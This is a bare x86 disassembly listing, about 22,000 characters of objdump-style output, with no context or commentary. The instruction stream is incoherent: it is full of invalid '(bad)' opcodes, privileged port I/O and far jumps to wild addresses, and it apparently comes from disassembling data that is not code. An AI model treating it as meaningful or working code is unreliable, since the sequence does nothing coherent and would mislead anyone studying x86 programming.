  42cefd:	retf   0xd4d4
  42cf00:	js     0x42cf47
  42cf02:	leave  
  42cf03:	pop    edi
  42cf04:	xor    al,0x2b
  42cf06:	pop    esp
  42cf07:	cmp    DWORD PTR [eax+0x59991e7d],edi
  42cf0d:	fwait
  42cf0e:	push   esp
  42cf0f:	fst    DWORD PTR [edi+ebx*1+0x759f626e]
  42cf16:	mov    dh,0x85
  42cf18:	stc    
  42cf19:	dec    esp
  42cf1a:	scas   eax,DWORD PTR es:[edi]
  42cf1b:	push   ebp
  42cf1c:	mov    DWORD PTR [edi+0x5a681fb4],eax
  42cf22:	shl    DWORD PTR [edi+0x74],cl
  42cf25:	dec    eax
  42cf26:	jb     0x42ceb4
  42cf28:	xchg   edi,eax
  42cf29:	test   esi,ebx
  42cf2b:	loope  0x42cf42
  42cf2d:	inc    edi
  42cf2f:	dec    esp
  42cf30:	mov    DWORD PTR ds:0xb191735f,eax
  42cf36:	repz cmp ebx,edi
  42cf39:	add    eax,0x85347116
  42cf3e:	sbb    DWORD PTR [esi],esp
  42cf40:	xchg   ecx,eax
  42cf41:	lods   al,BYTE PTR ds:[esi]
  42cf42:	pop    ds
  42cf43:	xor    DWORD PTR [edx-0x73],edi
  42cf46:	pop    es
  42cf47:	pop    ss
  42cf48:	ss push esp
  42cf4a:	jle    0x42ceeb
  42cf4c:	ins    DWORD PTR es:[edi],dx
  42cf4d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42cf4e:	adc    edx,esp
  42cf50:	pop    edi
  42cf51:	scas   eax,DWORD PTR es:[edi]
  42cf52:	lods   al,BYTE PTR ds:[esi]
  42cf53:	cmp    BYTE PTR [edi+0x48],0x64
  42cf57:	add    eax,0x3053efd1
  42cf5c:	dec    esp
  42cf5d:	add    bh,BYTE PTR [edi-0x628d0978]
  42cf63:	aad    0xfe
  42cf65:	popf   
  42cf66:	mov    cl,0xb7
  42cf68:	push   edx
  42cf69:	and    eax,0xc389ec92
  42cf6e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42cf6f:	ds in  al,dx
  42cf71:	jg     0x42cef4
  42cf73:	out    0xa1,al
  42cf75:	add    eax,0x93338eba
  42cf7a:	and    edi,ebp
  42cf7c:	outs   dx,DWORD PTR ds:[esi]
  42cf7d:	lods   al,BYTE PTR ds:[esi]
  42cf7e:	jnp    0x42cf5d
  42cf80:	ret    
  42cf81:	sar    BYTE PTR [edx+0x78],cl
  42cf84:	sbb    bl,al
  42cf86:	push   esp
  42cf87:	out    dx,eax
  42cf88:	das    
  42cf89:	and    eax,0x8f3c4700
  42cf8e:	imul   ebp,DWORD PTR [eax-0x2bf39dc5],0xfb46ebb5
  42cf98:	mov    BYTE PTR [edi],dl
  42cf9a:	test   ecx,0x18bb25e5
  42cfa0:	xlat   BYTE PTR ds:[ebx]
  42cfa1:	add    eax,0x362787ba
  42cfa6:	xchg   esi,eax
  42cfa7:	(bad)  
  42cfa8:	pop    ecx
  42cfa9:	out    0x68,al
  42cfab:	arpl   WORD PTR [esp+esi*4],cx
  42cfae:	test   al,0xfd
  42cfb0:	mov    BYTE PTR [esi+0x37],cl
  42cfb3:	nop
  42cfb4:	jmp    0xb49553bb
  42cfb9:	sub    eax,0xa9a26565
  42cfbe:	pop    bp
  42cfc0:	out    dx,eax
  42cfc1:	stos   DWORD PTR es:[edi],eax
  42cfc2:	sbb    ah,BYTE PTR [ecx+0x507945cf]
  42cfc8:	call   0xc2e9b5d2
  42cfcd:	fst    DWORD PTR [edx+0x32]
  42cfd0:	and    al,0x20
  42cfd2:	pop    ds
  42cfd3:	(bad)  [ebx+0x14cb50ba]
  42cfd9:	aas    
  42cfda:	(bad)  
  42cfdb:	aad    0x97
  42cfdd:	adc    al,0x8b
  42cfdf:	push   ss
  42cfe0:	stos   DWORD PTR es:[edi],eax
  42cfe1:	rol    DWORD PTR [ebx+esi*2+0x2c993d88],0xba
  42cfe9:	cmp    DWORD PTR [edi],0xffffff87
  42cfec:	pop    edi
  42cfed:	add    BYTE PTR [esi+0x2],ah
  42cff0:	out    0x8e,al
  42cff2:	cmp    BYTE PTR [edx],al
  42cff4:	es ret 
  42cff6:	sub    BYTE PTR [esi-0x3a1cc878],dh
  42cffc:	cli    
  42cffd:	in     ax,0xe9
  42d000:	outs   dx,BYTE PTR ds:[esi]
  42d001:	loop   0x42cf8d
  42d003:	fldln2 
  42d005:	add    eax,0xe5c7898c
  42d00a:	aaa    
  42d00b:	fdiv   QWORD PTR [eax+0x5eaf1f8f]
  42d011:	sbb    DWORD PTR [edi],esi
  42d013:	loope  0x42d009
  42d015:	add    al,0xda
  42d017:	aad    0x37
  42d019:	cli    
  42d01a:	bound  bp,DWORD PTR [ebx-0x57]
  42d01e:	ret    
  42d01f:	lock mov bh,bl
  42d022:	repnz mov edi,0xb27a2647
  42d028:	add    DWORD PTR [edx],0x32d66fb8
  42d02e:	pop    es
  42d02f:	mov    ds:0xc1601c76,eax
  42d034:	push   cs
  42d035:	cmp    al,0x26
  42d037:	add    eax,0x94131c4f
  42d03c:	mov    cl,0xe
  42d03e:	jnp    0x42d02d
  42d040:	push   edx
  42d041:	or     eax,0x9d759730
  42d046:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42d047:	mov    edx,0xf038d1fe
  42d04c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42d04d:	add    al,BYTE PTR [eax-0x68bab151]
  42d053:	mov    DWORD PTR [ecx-0x6aa489f1],ebx
  42d059:	ret    0xbb57
  42d05c:	mov    ds:0x8ece8e45,al
  42d061:	aaa    
  42d062:	icebp  
  42d063:	adc    esi,edx
  42d065:	add    ah,BYTE PTR [eax]
  42d067:	jge    0x42cff2
  42d069:	pushf  
  42d06a:	inc    edi
  42d06b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42d06c:	ret    
  42d06d:	fisub  WORD PTR [ebp-0x11]
  42d070:	lahf   
  42d071:	icebp  
  42d072:	arpl   WORD PTR [ebp-0x48],cx
  42d075:	mov    ds:0x6658af1c,al
  42d07a:	mov    dl,0x2f
  42d07c:	(bad)  
  42d07d:	add    eax,0x7e01e2a2
  42d082:	sbb    ebx,esi
  42d084:	mov    ebx,esi
  42d086:	push   0xffffffb1
  42d088:	frstor [esi+0x5e]
  42d08b:	out    0x85,eax
  42d08d:	add    bh,BYTE PTR [edi+ebx*2-0x5a]
  42d091:	or     dh,BYTE PTR [esi+0x60943835]
  42d097:	mov    edi,0x2d22396c
  42d09c:	test   al,0xb8
  42d09e:	mov    dl,0xd4
  42d0a0:	in     eax,0x6d
  42d0a2:	add    esp,esp
  42d0a4:	dec    ebx
  42d0a5:	or     esi,DWORD PTR [edx]
  42d0a7:	pop    ds
  42d0a8:	mov    DWORD PTR [ecx],edx
  42d0aa:	jle    0x42d11d
  42d0ac:	cmc    
  42d0ad:	mov    ebx,0x1d4d475d
  42d0b2:	inc    eax
  42d0b3:	push   es
  42d0b4:	leave  
  42d0b5:	out    0x38,eax
  42d0b7:	nop
  42d0b8:	enter  0x2cce,0xc4
  42d0bc:	sbb    al,cl
  42d0be:	inc    ebx
  42d0bf:	aam    0x35
  42d0c1:	mov    ds:0xe1bc03a3,eax
  42d0c6:	xchg   edi,eax
  42d0c7:	aad    0xd4
  42d0c9:	test   eax,0x42f53774
  42d0ce:	push   cs
  42d0cf:	out    dx,al
  42d0d0:	mov    BYTE PTR [edi+0x2e],dh
  42d0d3:	sbb    edx,ebp
  42d0d5:	pusha  
  42d0d6:	xchg   edi,eax
  42d0d7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42d0d8:	cdq    
  42d0d9:	add    dh,dh
  42d0db:	mov    esp,0xf1f92f6d
  42d0e0:	mov    bh,0xec
  42d0e2:	pusha  
  42d0e3:	mov    DWORD PTR [esi-0x45],esi
  42d0e6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42d0e7:	add    ah,BYTE PTR [ebx-0x6194f60a]
  42d0ed:	dec    edx
  42d0ee:	loopne 0x42d0c4
  42d0f0:	sub    eax,0xa6856b9
  42d0f5:	push   edi
  42d0f6:	pop    ds
  42d0f7:	pop    edi
  42d0f8:	push   ss
  42d0f9:	mov    ebx,0xe8908c41
  42d0fe:	and    edi,edx
  42d100:	(bad)  
  42d101:	js     0x42d0b6
  42d103:	outs   dx,DWORD PTR ds:[esi]
  42d104:	xor    BYTE PTR [edx],dh
  42d106:	hlt    
  42d107:	push   cs
  42d108:	push   edx
  42d109:	mov    ebx,0xe18834a6
  42d10e:	inc    ah
  42d110:	repz dec esp
  42d112:	test   eax,0xa4035a79
  42d117:	(bad)  
  42d118:	push   ds
  42d119:	jbe    0x42d0fc
  42d11b:	cmp    al,0x21
  42d11d:	mov    edi,0xda1c9b75
  42d122:	ins    BYTE PTR es:[edi],dx
  42d123:	mov    edx,0xdcd7025d
  42d128:	pop    edx
  42d129:	arpl   WORD PTR [eax-0x5d5fa52c],di
  42d12f:	pop    ds
  42d130:	in     al,dx
  42d131:	inc    edx
  42d132:	add    BYTE PTR [ecx-0x10a1874],bl
  42d138:	movs   DWORD PTR es:[di],DWORD PTR ds:[si]
  42d13a:	pop    esi
  42d13b:	aad    0xf4
  42d13d:	push   edx
  42d13e:	jge    0x42d138
  42d140:	test   DWORD PTR ds:0x8afdac04,0x93b34f7
  42d14a:	outs   dx,BYTE PTR ds:[esi]
  42d14b:	xchg   ebp,eax
  42d14c:	scas   eax,DWORD PTR es:[edi]
  42d14d:	out    dx,al
  42d14e:	adc    eax,DWORD PTR [eax+ebp*8+0x7c]
  42d152:	sbb    ecx,DWORD PTR gs:[ebp+0x4b]
  42d156:	mov    ah,0xb
  42d158:	mov    BYTE PTR [edx],al
  42d15a:	jmp    0x8af2:0xa04184b3
  42d161:	mov    edi,0x77f26719
  42d166:	xchg   esp,eax
  42d167:	push   0xd357d958
  42d16c:	xor    BYTE PTR [eax],dh
  42d16e:	push   ebx
  42d16f:	ja     0x42d1ab
  42d171:	push   0x2e
  42d173:	sti    
  42d174:	jnp    0x42d11f
  42d176:	pusha  
  42d177:	sub    eax,0x21746c48
  42d17c:	push   ss
  42d17d:	push   ds
  42d17e:	sub    BYTE PTR [edx+0x5144260e],ch
  42d184:	jle    0x42d1fa
  42d186:	sti    
  42d187:	xor    eax,0xdd3de8e
  42d18c:	mov    fs,ebp
  42d18e:	fwait
  42d18f:	fwait
  42d190:	nop
  42d191:	sbb    eax,DWORD PTR [edx]
  42d193:	aaa    
  42d194:	push   eax
  42d195:	push   es
  42d196:	sbb    al,0xd6
  42d198:	sar    BYTE PTR [ebx+ecx*8],0x2f
  42d19c:	push   esi
  42d19d:	and    eax,0x41805542
  42d1a2:	push   ds
  42d1a3:	xchg   ebx,eax
  42d1a4:	jecxz  0x42d1be
  42d1a6:	cdq    
  42d1a7:	and    dl,BYTE PTR [edi+ebp*2+0x79]
  42d1ab:	stos   DWORD PTR es:[edi],eax
  42d1ac:	pop    ss
  42d1ad:	jmp    0xc560:0xed313edd
  42d1b4:	data16 icebp 
  42d1b6:	jbe    0x42d236
  42d1b8:	xchg   edi,eax
  42d1b9:	pop    ss
  42d1ba:	pop    eax
  42d1bb:	pushf  
  42d1bc:	popf   
  42d1bd:	ret    0xbe9b
  42d1c0:	scas   al,BYTE PTR es:[edi]
  42d1c1:	jo     0x42d1f8
  42d1c3:	in     al,0x9a
  42d1c5:	add    ebp,DWORD PTR [esp+ecx*4+0x2f95fb1d]
  42d1cc:	mov    al,0xc3
  42d1ce:	jnp    0x42d205
  42d1d0:	mov    ebx,0x965d1f67
  42d1d5:	jb     0x42d247
  42d1d7:	push   edx
  42d1d8:	and    al,0x5b
  42d1da:	test   ah,dl
  42d1dc:	sub    ch,BYTE PTR [edi-0xe0391ed]
  42d1e2:	or     dl,ah
  42d1e4:	mov    DWORD PTR [ebp+0x7639ca78],esi
  42d1ea:	xor    ebp,esp
  42d1ec:	xchg   esp,eax
  42d1ed:	mov    gs,WORD PTR [edi+0x1bd694cf]
  42d1f3:	jl     0x42d17d
  42d1f5:	jmp    0x42d19f
  42d1f7:	inc    edx
  42d1f8:	dec    ecx
  42d1f9:	cmc    
  42d1fa:	pop    ds
  42d1fb:	xor    eax,DWORD PTR [ecx]
  42d1fd:	push   esi
  42d1fe:	xchg   esi,eax
  42d1ff:	popa   
  42d200:	call   0x5f23:0x87abe16b
  42d207:	aad    0x8c
  42d209:	(bad)  
  42d20a:	int3   
  42d20b:	pop    ss
  42d20c:	and    al,cl
  42d20e:	pop    ds
  42d20f:	loope  0x42d1e3
  42d211:	arpl   WORD PTR [edx+0x54],si
  42d214:	lods   al,BYTE PTR ds:[esi]
  42d215:	add    al,0x2e
  42d217:	xlat   BYTE PTR ds:[ebx]
  42d218:	mov    ch,0x1a
  42d21a:	loop   0x42d248
  42d21c:	cld    
  42d21d:	(bad)  
  42d21e:	stc    
  42d21f:	les    ecx,FWORD PTR [ecx+0x60dad6f1]
  42d225:	es je  0x42d282
  42d228:	mov    ebp,DWORD PTR [edx-0x5e77fbc3]
  42d22e:	ins    DWORD PTR es:[edi],dx
  42d22f:	mov    cl,0x47
  42d231:	out    dx,al
  42d232:	or     BYTE PTR [edx+0x37dcbd8f],0xd
  42d239:	(bad)  
  42d23b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42d23c:	sti    
  42d23d:	inc    esi
  42d23e:	fstp   QWORD PTR [eax+ebp*1+0x59]
  42d242:	sbb    bh,dl
  42d244:	xor    DWORD PTR [ebp-0x4c],ebx
  42d247:	cli    
  42d248:	xor    al,0xb1
  42d24a:	stos   DWORD PTR es:[edi],eax
  42d24b:	test   al,0x88
  42d24d:	adc    eax,0x318a0072
  42d252:	mov    dh,BYTE PTR [edi+0x21]
  42d255:	add    ah,BYTE PTR [ecx+edi*8]
  42d258:	add    DWORD PTR [ebp-0x4028a060],ecx
  42d25e:	pusha  
  42d25f:	sbb    eax,0x6b62c7e
  42d264:	add    al,0x27
  42d266:	icebp  
  42d267:	aam    0xc1
  42d269:	ror    BYTE PTR [esi-0x4c],0xf8
  42d26d:	pop    ebp
  42d26e:	mov    eax,0x5527f11b
  42d273:	aam    0x70
  42d275:	mov    dl,0x1d
  42d277:	out    dx,eax
  42d278:	mov    eax,0x64d5ae99
  42d27d:	pop    es
  42d27e:	mov    ah,0xaf
  42d280:	inc    edx
  42d281:	dec    edi
  42d282:	das    
  42d283:	cmp    eax,0xd58f99f5
  42d288:	fldenv [eax+0x6d]
  42d28b:	cli    
  42d28c:	push   ecx
  42d28d:	xchg   ebp,eax
  42d28e:	mov    cl,0x5e
  42d290:	out    0xea,al
  42d292:	pop    ebp
  42d293:	adc    BYTE PTR [ebx+0x3],0x51
  42d297:	leave  
  42d298:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42d299:	ins    BYTE PTR es:[edi],dx
  42d29a:	xor    eax,0xb9a98877
  42d29f:	fs mov esi,0xe307be53
  42d2a5:	add    eax,0x2159eab6
  42d2aa:	fs sbb eax,ecx
  42d2ad:	adc    bl,BYTE PTR [edi]
  42d2af:	xor    esi,DWORD PTR [ebx+ebp*8]
  42d2b2:	and    esp,ecx
  42d2b4:	xchg   edx,eax
  42d2b5:	jp     0x42d30f
  42d2b7:	aam    0x36
  42d2b9:	mov    eax,0x8afa3b4d
  42d2be:	loopne 0x42d302
  42d2c0:	sti    
  42d2c1:	lahf   
  42d2c2:	pop    esp
  42d2c3:	jl     0x42d30f
  42d2c5:	add    BYTE PTR [edi],bl
  42d2c7:	jg     0x42d24c
  42d2c9:	scas   al,BYTE PTR es:[edi]
  42d2ca:	jmp    0xc5d2b854
  42d2cf:	cmp    dh,dh
  42d2d1:	jmp    0x42d34f
  42d2d3:	sahf   
  42d2d4:	dec    edx
  42d2d5:	or     eax,0x2f2dd458
  42d2da:	imul   esp,edi,0xffffffea
  42d2dd:	cwde   
  42d2de:	nop
  42d2df:	push   ecx
  42d2e0:	fadd   DWORD PTR ds:0x74ebe91
  42d2e6:	js     0x42d29f
  42d2e8:	loope  0x42d2ec
  42d2ea:	jl     0x42d35f
  42d2ec:	jbe    0x42d2f8
  42d2ee:	pushf  
  42d2ef:	xchg   edx,eax
  42d2f0:	ret    0x60e8
  42d2f3:	sbb    esp,DWORD PTR [edi+0x362bfee4]
  42d2f9:	push   esi
  42d2fa:	out    0xd5,al
  42d2fc:	sbb    eax,0xe47225ca
  42d301:	xchg   ebp,eax
  42d302:	sbb    dl,bl
  42d304:	mov    ch,0xe5
  42d306:	dec    ebx
  42d307:	mov    al,BYTE PTR [esi]
  42d309:	(bad)  [esi]
  42d30b:	pmuludq mm0,QWORD PTR [ebp-0x646f83dd]
  42d312:	and    bl,ah
  42d314:	xor    DWORD PTR [esp+eax*1],esp
  42d317:	cld    
  42d318:	fadd   st(3),st
  42d31a:	mov    al,ds:0x3807084
  42d31f:	js     0x42d2a9
  42d321:	cmovo  edi,DWORD PTR [edx-0x29552a66]
  42d328:	loope  0x42d370
  42d32a:	mov    ah,0xe8
  42d32c:	rol    BYTE PTR ds:0xe08e58ab,1
  42d332:	ja     0x42d348
  42d334:	mov    ecx,esi
  42d336:	ret    
  42d337:	imul   ebx,DWORD PTR [esi-0x1f2623ea],0x2
  42d33e:	xor    BYTE PTR [ebp+0x69],dl
  42d341:	popa   
  42d342:	popf   
  42d343:	jmp    0x42d380
  42d345:	leave  
  42d346:	pusha  
  42d347:	mov    cl,0xd6
  42d349:	sbb    eax,0x21cbae9b
  42d34f:	xlat   BYTE PTR ds:[ebx]
  42d350:	pop    edx
  42d351:	mov    edi,0x43c25ee7
  42d356:	sahf   
  42d357:	in     al,dx
  42d358:	mov    BYTE PTR [ecx],ah
  42d35a:	push   esi
  42d35b:	fldcw  WORD PTR [ebx*8+0x23325f4]
  42d362:	mov    edx,0x2a888fb5
  42d367:	(bad)  
  42d368:	jmp    0x42d3de
  42d36a:	pop    ds
  42d36b:	inc    DWORD PTR [ecx+edx*4-0x4f]
  42d36f:	cs test al,0xd5
  42d372:	fwait
  42d373:	aad    0x1f
  42d375:	push   es
  42d376:	scas   al,BYTE PTR es:[edi]
  42d377:	retf   
  42d378:	xor    bh,bl
  42d37a:	fstp   TBYTE PTR [ebx+0x250fb989]
  42d380:	mov    dh,0x74
  42d382:	mov    al,0x51
  42d384:	pop    ebx
  42d385:	add    dh,BYTE PTR [edx+0x40]
  42d388:	loopne 0x42d348
  42d38a:	xchg   edx,eax
  42d38b:	outs   dx,BYTE PTR ds:[esi]
  42d38c:	(bad)  
  42d38d:	sti    
  42d38e:	push   eax
  42d38f:	push   ebx
  42d390:	push   0xffffff8a
  42d392:	sub    al,0x91
  42d394:	call   0x8728479e
  42d399:	jle    0x42d341
  42d39b:	cmp    eax,0xf1fcfdb
  42d3a0:	add    cl,ah
  42d3a2:	cli    
  42d3a3:	push   esp
  42d3a4:	jbe    0x42d32f
  42d3a6:	add    bh,dl
  42d3a8:	mov    esi,0x2c6c463d
  42d3ad:	push   cs
  42d3ae:	dec    edx
  42d3af:	sub    al,0x8b
  42d3b1:	arpl   cx,ax
  42d3b3:	mov    dh,0x5
  42d3b5:	or     eax,0x315832f5
  42d3ba:	or     dl,bh
  42d3bc:	xchg   edi,eax
  42d3bd:	loopne 0x42d3eb
  42d3bf:	mov    ah,0x55
  42d3c1:	add    eax,0x4b8f27c4
  42d3c6:	rol    bh,1
  42d3c8:	mov    WORD PTR [ebx+0x620e340a],?
  42d3ce:	add    ah,dl
  42d3d0:	(bad)  
  42d3d1:	jns    0x42d446
  42d3d3:	pop    ecx
  42d3d4:	fucom  st(3)
  42d3d6:	shr    BYTE PTR ds:0xd5cab5fd,1
  42d3dc:	pop    ebp
  42d3dd:	mov    esp,0xa2ec1190
  42d3e2:	imul   ecx,DWORD PTR [ebp-0x5dab7b9d],0xffffff86
  42d3e9:	xchg   edi,eax
  42d3ea:	or     ebp,DWORD PTR ds:0x9d51e203
  42d3f0:	lods   eax,DWORD PTR ds:[esi]
  42d3f1:	pop    ss
  42d3f2:	pop    ds
  42d3f3:	jmp    0x42d46f
  42d3f5:	sub    DWORD PTR [ebx+ebx*4],edx
  42d3f8:	data16 das 
  42d3fa:	add    al,0xf8
  42d3fc:	xchg   ecx,eax
  42d3fd:	add    bl,BYTE PTR [esi-0x24]
  42d400:	xchg   esi,eax
  42d401:	mov    edx,0x480464f9
  42d406:	pop    edx
  42d407:	scas   eax,DWORD PTR es:[edi]
  42d408:	cmp    BYTE PTR ds:0x2481dc1f,0xde
  42d40f:	test   al,0xbc
  42d411:	or     DWORD PTR [ecx-0x44830d2b],eax
  42d417:	rcl    eax,0x17
  42d41a:	(bad)  
  42d41b:	sahf   
  42d41c:	mov    DWORD PTR [ebx],edi
  42d41e:	sub    al,0xbf
  42d420:	and    eax,0xaab3194e
  42d425:	add    eax,0x5140fc62
  42d42a:	xchg   BYTE PTR [edx+edx*2],cl
  42d42d:	lds    ebx,FWORD PTR [edi]
  42d42f:	xlat   BYTE PTR ds:[ebx]
  42d430:	pop    ecx
  42d431:	xor    eax,0x61023f3e
  42d436:	ret    
  42d437:	call   0x993809c0
  42d43c:	xchg   esp,eax
  42d43d:	push   cs
  42d43e:	add    dl,BYTE PTR [ebx+eiz*2+0x2c]
  42d442:	icebp  
  42d443:	dec    edi
  42d444:	ss dec eax
  42d446:	std    
  42d447:	mov    esp,0x14fc6433
  42d44c:	lea    edx,[ebx-0x58]
  42d44f:	sbb    DWORD PTR [esi],ebp
  42d451:	bound  ecx,QWORD PTR [ecx+0x54c9d58c]
  42d457:	xchg   edx,eax
  42d458:	mov    ss,ebx
  42d45a:	(bad)  
  42d45b:	imul   eax,DWORD PTR [edx+0x54],0x39fe024f
  42d462:	pop    ds
  42d463:	ja     0x42d4d3
  42d465:	push   edx
  42d466:	fsubr  QWORD PTR [esi]
  42d468:	and    al,0x9f
  42d46a:	cmp    bl,bl
  42d46c:	inc    ebp
  42d46d:	add    ebp,esi
  42d46f:	rol    eax,0x6f
  42d472:	adc    al,0xde
  42d474:	pusha  
  42d475:	das    
  42d476:	dec    edi
  42d477:	outs   dx,BYTE PTR ds:[esi]
  42d478:	mov    BYTE PTR [ecx-0x73099ce3],dh
  42d47e:	and    BYTE PTR [eax+eax*8-0x26],cl
  42d482:	jl     0x42d459
  42d484:	push   edi
  42d485:	sbb    eax,0xe9cb3029
  42d48a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42d48b:	or     al,0x74
  42d48d:	adc    dl,ah
  42d48f:	imul   ebp,DWORD PTR [eax+0x5d],0x4d6cd5ce
  42d496:	or     dl,dl
  42d498:	push   eax
  42d499:	sbb    ebx,ebx
  42d49b:	mov    dl,0xb8
  42d49d:	sbb    al,0x1f
  42d49f:	pop    ebp
  42d4a0:	(bad)  
  42d4a1:	xor    ebx,DWORD PTR [esi+0x7c]
  42d4a4:	retf   0x7c9d
  42d4a7:	aam    0x39
  42d4a9:	push   edx
  42d4aa:	dec    edx
  42d4ab:	mov    eax,ds:0x586dcaad
  42d4b0:	xchg   DWORD PTR [ebp+0x289fdd2e],edi
  42d4b6:	fisttp WORD PTR [ecx]
  42d4b8:	stos   BYTE PTR es:[edi],al
  42d4b9:	or     esi,DWORD PTR [ebp+edx*8-0x2b4b72f1]
  42d4c0:	cmp    al,0xbf
  42d4c2:	stos   BYTE PTR es:[edi],al
  42d4c3:	test   BYTE PTR [ecx-0x7b744f7b],cl
  42d4c9:	bound  esp,QWORD PTR [ebp+ebp*1-0x4]
  42d4cd:	add    DWORD PTR [esi],esi
  42d4cf:	adc    dh,al
  42d4d1:	scas   al,BYTE PTR es:[edi]
  42d4d2:	aam    0x47
  42d4d4:	mov    DWORD PTR [edx],ebp
  42d4d6:	jns    0x42d4f5
  42d4d8:	jecxz  0x42d4ad
  42d4da:	lfs    edx,FWORD PTR [ebp+0x5f4adfb5]
  42d4e1:	in     al,0x3f
  42d4e3:	push   edi
  42d4e4:	mov    esp,0x67a4cbaf
  42d4e9:	inc    ebp
  42d4ea:	cwde   
  42d4eb:	ins    DWORD PTR es:[edi],dx
  42d4ec:	rcr    DWORD PTR [edx+ebx*1],1
  42d4ef:	xchg   edx,eax
  42d4f0:	mov    ecx,0xf89c75a7
  42d4f5:	(bad)  
  42d4f6:	(bad)  
  42d4f7:	ror    DWORD PTR [ecx-0x13edc047],0x99
  42d4fe:	pusha  
  42d4ff:	xchg   edx,eax
  42d500:	add    esi,DWORD PTR ds:[esi+0x2b]
  42d504:	mov    ebx,0x8dd2f6a6
  42d509:	inc    ebp
  42d50a:	pop    ds
  42d50b:	ins    DWORD PTR es:[edi],dx
  42d50c:	adc    ch,BYTE PTR [edi]
  42d50e:	std    
  42d50f:	mov    eax,ds:0x15cb4018
  42d514:	jp     0x42d518
  42d516:	and    BYTE PTR [eax+0x1d],ah
  42d519:	and    BYTE PTR [ebp+0x19],bh
  42d51c:	xor    eax,ecx
  42d51e:	pusha  
  42d51f:	and    ebp,DWORD PTR [ebx+0x3f]
  42d522:	daa    
  42d523:	mov    ch,0x24
  42d525:	fldl2e 
  42d527:	mov    ecx,0xafa215d5
  42d52c:	dec    eax
  42d52d:	(bad)  
  42d52e:	jmp    0x42d5a7
  42d530:	pushf  
  42d531:	mov    ch,0x60
  42d533:	lds    ebx,FWORD PTR [edx+0x45]
  42d536:	shl    ch,0x8
  42d539:	leave  
  42d53a:	cmp    bh,dl
  42d53c:	js     0x42d54c
  42d53e:	dec    edi
  42d53f:	mov    cl,BYTE PTR [edi]
  42d541:	pop    esp
  42d542:	inc    esp
  42d543:	std    
  42d544:	xchg   esi,eax
  42d545:	shl    DWORD PTR [edi+0x37],1
  42d548:	inc    edx
  42d549:	push   esp
  42d54a:	fldenv [ecx+0x62]
  42d54d:	dec    ebp
  42d54e:	sbb    dl,BYTE PTR [edi-0x4a]
  42d551:	mov    dl,BYTE PTR [edx]
  42d553:	inc    ebp
  42d554:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42d555:	pop    edi
  42d556:	jp     0x42d5d4
  42d558:	xchg   esp,eax
  42d559:	inc    edi
  42d55a:	and    ecx,ebx
  42d55c:	or     DWORD PTR [edx-0x11],ecx
  42d55f:	inc    edx
  42d560:	pushf  
  42d561:	leave  
  42d562:	push   0xffffffd5
  42d564:	adc    ah,BYTE PTR [edi-0x2bffd9bd]
  42d56a:	loope  0x42d566
  42d56c:	icebp  
  42d56d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42d56e:	add    eax,0xdc301ed7
  42d573:	ins    BYTE PTR es:[edi],dx
  42d574:	mov    ds:0x35d22aec,al
  42d579:	or     DWORD PTR [eax],esi
  42d57b:	inc    esi
  42d57c:	(bad)  
  42d57d:	jmp    0x42d5c5
  42d57f:	add    cl,cl
  42d581:	and    BYTE PTR [ebx+0x56],al
  42d584:	xchg   esp,eax
  42d585:	jno    0x42d55d
  42d587:	mov    ebp,DWORD PTR [ebp-0x7d]
  42d58a:	shr    cl,cl
  42d58c:	jle    0x42d5d3
  42d58e:	and    eax,0x12b607d7
  42d593:	adc    DWORD PTR [ebp-0x7709cd0c],edi
  42d599:	fwait
  42d59a:	repz inc ecx
  42d59c:	mov    eax,0xcf6f362d
  42d5a1:	sbb    al,0xc0
  42d5a3:	add    BYTE PTR [esi-0x67d2d51f],0x4c
  42d5aa:	push   eax
  42d5ab:	nop
  42d5ac:	mov    DWORD PTR [ecx],ebx
  42d5ae:	retfw  
  42d5b0:	retf   
  42d5b1:	push   cs
  42d5b2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42d5b3:	pop    eax
  42d5b4:	push   ebx
  42d5b5:	add    cl,BYTE PTR [esi]
  42d5b7:	jb     0x42d5ee
  42d5b9:	lds    esi,FWORD PTR [ebx]
  42d5bb:	xchg   ebx,eax
  42d5bc:	sbb    eax,0x9ec7b770
  42d5c1:	sahf   
  42d5c2:	pop    ds
  42d5c3:	pop    ss
  42d5c4:	fwait
  42d5c5:	ret    0x5460
  42d5c8:	add    al,0x3
  42d5ca:	mov    ah,0x1a
  42d5cc:	mov    eax,ds:0x504f66d6
  42d5d1:	fwait
  42d5d2:	gs mov cl,0xb3
  42d5d5:	jp     0x42d5a1
  42d5d7:	cmp    edi,DWORD PTR [ebp+edx*8+0x3323492]
  42d5de:	mov    BYTE PTR [edx+0x53],al
  42d5e1:	and    bh,BYTE PTR [ebp-0x20]
  42d5e4:	jno    0x42d642
  42d5e6:	push   ds
  42d5e7:	xor    eax,0x1320a996
  42d5ec:	and    al,0xd7
  42d5ee:	stos   DWORD PTR es:[edi],eax
  42d5ef:	aad    0xeb
  42d5f1:	(bad)  
  42d5f2:	or     BYTE PTR [ecx-0x6a0b572d],bl
  42d5f8:	mov    BYTE PTR [edi-0x7edc39dc],dl
  42d5fe:	ja     0x42d64e
  42d600:	lods   al,BYTE PTR ds:[esi]
  42d601:	add    cl,BYTE PTR [eax-0x3c71159e]
  42d607:	or     eax,0x6b1ff767
  42d60c:	jns    0x42d5e4
  42d60e:	jge    0x42d659
  42d610:	pop    esp
  42d611:	pop    esp
  42d612:	out    dx,al
  42d613:	aad    0x3c
  42d615:	call   0xae6ac702
  42d61a:	loopne 0x42d5f2
  42d61c:	mov    gs,WORD PTR [ecx-0x3b]
  42d61f:	jnp    0x42d628
  42d621:	icebp  
  42d622:	mov    ah,0xd7
  42d624:	pop    ecx
  42d625:	aas    
  42d626:	mov    esi,0xb6035d97
  42d62b:	and    ecx,ebx
  42d62d:	mov    dl,0xf6
  42d62f:	addr16 cmc 
  42d631:	dec    ecx
  42d632:	pop    ds
  42d633:	sub    ebx,DWORD PTR [edx+0x1d]
  42d636:	popa   
